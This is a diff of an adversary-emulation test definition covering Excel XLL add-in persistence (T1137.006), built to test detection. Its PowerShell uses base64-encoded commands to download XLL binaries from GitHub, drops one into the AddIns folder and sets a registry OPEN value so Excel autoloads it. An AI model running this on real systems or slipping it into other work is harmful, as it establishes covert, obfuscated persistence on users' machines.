@@ -1,47 +1,21 @@
-- id: 6b707372-8252-558f-bfa5-4d02cc78da86
+- requirements: []
   name: Soumaia ART Tests - Persistent Code Execution Via Excel Add-in File (XLL)
   description: 'Creates an Excel Add-in file (XLL) and sets a registry key to make it run automatically when Excel is started
 
     The sample XLL provided launches the notepad as a proof-of-concept for persistent execution from Office.'
   tactic: persistence
-  technique:
-    attack_id: T1137.006
-    name: 'Office Application Startup: Add-ins'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBFAHgAYwBlAGwALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIgAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAiAEUAeABjAGUAbAAiAAoAIAAgAGUAeABpAHQAIAAwAAoAfQAgAGMAYQB0AGMAaAAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAEUAeABjAGUAbAAgAG0AYQBuAHUAYQBsAGwAeQAgAHQAbwAgAG0AZQBlAHQAIAB0AGgAaQBzACAAcgBlAHEAdQBpAHIAZQBtAGUAbgB0ACIACgA=
-          }
-          powershell -NoProfile -EncodedCommand aQBmACAAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAuAFwAZQB4AGMAZQBsAHgAbABsAF8AeAA2ADQALgB4AGwAbAAiACkAIAAtAGEAbgBkACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGUAeABjAGUAbAB4AGwAbABfAHgAOAA2AC4AeABsAGwAIgApACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABBAGQAZABpAG4AcwAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMwA3AC4AMAAwADYALwBiAGkAbgAvAEEAZABkAGkAbgBzAC8AZQB4AGMAZQBsAHgAbABsAF8AeAA2ADQALgB4AGwAbAAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAGUAeABjAGUAbAB4AGwAbABfAHgANgA0AC4AeABsAGwAIgAKAEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAxADMANwAuADAAMAA2AC8AYgBpAG4ALwBBAGQAZABpAG4AcwAvAGUAeABjAGUAbAB4AGwAbABfAHgAOAA2AC4AeABsAGwAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABlAHgAYwBlAGwAeABsAGwAXwB4ADgANgAuAHgAbABsACIA
-          }
-          $excelApp = New-Object -COMObject "Excel.Application"
-          if(-not $excelApp.path.contains("Program Files (x86)")){
-              Write-Host "64-bit Office"
-              Copy ".\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
-          }
-          else{
-            Write-Host "32-bit Office"
-            Copy ".\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll"
-          }
-          $ver = $excelApp.version
-          $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"
-          Remove-Item $ExcelRegPath -ErrorAction Ignore
-          New-Item -type Directory $ExcelRegPath | Out-Null
-          New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null
-          $excelApp.Quit()
-          Start-Process "Excel"
-        cleanup: |-
-          $ver = (New-Object -COMObject "Excel.Application").version
-          Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore
-          Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
-          Start-Sleep 3
-          Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
-        payloads:
-        - Addins
-        - excelxll_x64.xll
-        - excelxll_x86.xll
+  technique_id: T1137.006
+  technique_name: 'Office Application Startup: Add-ins'
+  executors:
+  - cleanup:
+    - $ver = (New-Object -COMObject "Excel.Application").version; Remove-Item "HKCU:\Software\Microsoft\Office\$Ver\Excel\Options" -ErrorAction Ignore; Stop-Process -Name "notepad","Excel" -ErrorAction Ignore; Start-Sleep 3; Remove-Item "$env:APPDATA\Microsoft\AddIns\notepad.xll" -ErrorAction Ignore
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - Addins
+    - excelxll_x64.xll
+    - excelxll_x86.xll
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand dAByAHkAIAB7AAoAIAAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAEMATwBNAE8AYgBqAGUAYwB0ACAAIgBFAHgAYwBlAGwALgBBAHAAcABsAGkAYwBhAHQAaQBvAG4AIgAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgAgACAAUwB0AG8AcAAtAFAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIAAiAEUAeABjAGUAbAAiAAoAIAAgAGUAeABpAHQAIAAwAAoAfQAgAGMAYQB0AGMAaAAgAHsAIABlAHgAaQB0ACAAMQAgAH0ACgA=; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACIAWQBvAHUAIAB3AGkAbABsACAAbgBlAGUAZAAgAHQAbwAgAGkAbgBzAHQAYQBsAGwAIABNAGkAYwByAG8AcwBvAGYAdAAgAEUAeABjAGUAbAAgAG0AYQBuAHUAYQBsAGwAeQAgAHQAbwAgAG0AZQBlAHQAIAB0AGgAaQBzACAAcgBlAHEAdQBpAHIAZQBtAGUAbgB0ACIACgA= }; powershell -NoProfile -EncodedCommand aQBmACAAKAAoAFQAZQBzAHQALQBQAGEAdABoACAAIgAuAFwAZQB4AGMAZQBsAHgAbABsAF8AeAA2ADQALgB4AGwAbAAiACkAIAAtAGEAbgBkACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAGUAeABjAGUAbAB4AGwAbABfAHgAOAA2AC4AeABsAGwAIgApACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAiAC4AXABBAGQAZABpAG4AcwAiACAALQBGAG8AcgBjAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgByAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBhAHQAbwBtAGkAYwAtAHIAZQBkAC0AdABlAGEAbQAvAHIAYQB3AC8AbQBhAHMAdABlAHIALwBhAHQAbwBtAGkAYwBzAC8AVAAxADEAMwA3AC4AMAAwADYALwBiAGkAbgAvAEEAZABkAGkAbgBzAC8AZQB4AGMAZQBsAHgAbABsAF8AeAA2ADQALgB4AGwAbAAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwAgAC0ATwB1AHQARgBpAGwAZQAgACIALgBcAGUAeABjAGUAbAB4AGwAbABfAHgANgA0AC4AeABsAGwAIgAKAEkAbgB2AG8AawBlAC0AVwBlAGIAcgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AcgBlAGQAYwBhAG4AYQByAHkAYwBvAC8AYQB0AG8AbQBpAGMALQByAGUAZAAtAHQAZQBhAG0ALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AYQB0AG8AbQBpAGMAcwAvAFQAMQAxADMANwAuADAAMAA2AC8AYgBpAG4ALwBBAGQAZABpAG4AcwAvAGUAeABjAGUAbAB4AGwAbABfAHgAOAA2AC4AeABsAGwAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAC4AXABlAHgAYwBlAGwAeABsAGwAXwB4ADgANgAuAHgAbABsACIA }; $excelApp = New-Object -COMObject "Excel.Application"; if(-not $excelApp.path.contains("Program Files (x86)")){ Write-Host "64-bit Office"; Copy ".\excelxll_x64.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll" } else{ Write-Host "32-bit Office"; Copy ".\excelxll_x86.xll" "$env:APPDATA\Microsoft\AddIns\notepad.xll" }; $ver = $excelApp.version; $ExcelRegPath="HKCU:\Software\Microsoft\Office\$Ver\Excel\Options"; Remove-Item $ExcelRegPath -ErrorAction Ignore; New-Item -type Directory $ExcelRegPath | Out-Null; New-ItemProperty $ExcelRegPath OPEN -value "/R notepad.xll" -propertyType string | Out-Null; $excelApp.Quit(); Start-Process "Excel"
+  id: 6b707372-8252-558f-bfa5-4d02cc78da86
